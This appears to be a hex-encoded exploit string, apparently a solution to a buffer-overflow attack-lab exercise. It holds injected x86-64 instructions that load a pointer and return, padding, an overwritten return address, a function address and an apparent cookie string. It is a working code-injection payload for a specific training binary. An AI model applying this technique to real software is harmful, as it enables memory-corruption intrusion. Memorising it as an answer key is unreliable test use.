48 c7 c7 90 bf 65 55 c3
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
48 bf 65 55 00 00 00 00
44 20 40 00 00 00 00 00
32 66 36 63 62 32 64 36
00

